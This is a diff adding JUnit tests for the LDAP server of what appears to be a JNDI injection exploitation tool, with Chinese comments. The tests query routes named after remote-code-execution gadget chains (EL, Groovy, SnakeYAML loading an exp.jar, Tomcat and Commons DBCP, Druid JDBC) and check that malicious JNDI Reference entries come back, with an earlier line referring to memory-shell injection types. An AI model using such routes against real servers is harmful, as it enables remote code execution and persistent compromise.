@@ -96,6 +96,44 @@ public class LdapServerIntegrationTest {
                 serverLog.toString("UTF-8").contains("无该内存马类型"));
     }
 
+    // #8: BeanFactory 系 12 类路由直返 Reference 属性，不依赖 javaSerializedData 信任。
+    @Test
+    public void beanFactoryRoutesReturnDirectReference() throws Exception {
+        String[] routes = {
+                "EL/id", "groovyBytomcat/id", "snakeyaml/http://127.0.0.1/exp.jar",
+                "XStream/id", "mvel/id", "BeanShell2/id",
+                "tomcat_dbcp1_RCE/http://127.0.0.1/a.xml", "tomcat_dbcp2_RCE/http://127.0.0.1/a.xml",
+                "commons_dbcp1_RCE/http://127.0.0.1/a.xml", "commons_dbcp2_RCE/http://127.0.0.1/a.xml",
+                "druidjdbc/http://127.0.0.1/a.xml", "tomcatjdbc/http://127.0.0.1/a.xml",
+        };
+        try (LDAPConnection conn = new LDAPConnection("127.0.0.1", ldapPort)) {
+            for (String route : routes) {
+                SearchResultEntry entry = conn.searchForEntry(route, SearchScope.BASE, "(objectClass=*)");
+                Assert.assertNotNull(route, entry);
+                Assert.assertNotNull(route + " 应含 javaClassName", entry.getAttributeValue("javaClassName"));
+                Assert.assertNotNull(route + " 应含 javaFactory", entry.getAttributeValue("javaFactory"));
+                String[] addrs = entry.getAttributeValues("javaReferenceAddress");
+                Assert.assertNotNull(route + " 应含 javaReferenceAddress", addrs);
+                Assert.assertTrue(route + " refAddr 应按序编码: " + addrs[0], addrs[0].startsWith("#0#"));
+                Assert.assertNull(route + " 不应含 javaSerializedData", entry.getAttributeValue("javaSerializedData"));
+            }
+        }
+    }
+
+    // #8: --force-serialize 回退为序列化输出（旧行为对照）。
+    @Test
+    public void forceSerializeFallsBackToSerializedData() throws Exception {
+        config.forceSerialize = true;
+        try (LDAPConnection conn = new LDAPConnection("127.0.0.1", ldapPort)) {
+            SearchResultEntry entry = conn.searchForEntry("EL/id", SearchScope.BASE, "(objectClass=*)");
+            Assert.assertNotNull(entry);
+            Assert.assertNotNull("force-serialize 应输出 javaSerializedData", entry.getAttributeValue("javaSerializedData"));
+            Assert.assertNull("force-serialize 不应直返 Reference", entry.getAttributeValue("javaReferenceAddress"));
+        } finally {
+            config.forceSerialize = false;
+        }
+    }
+
     private static int freePort() throws Exception {
         try (ServerSocket socket = new ServerSocket(0)) {
             return socket.getLocalPort();
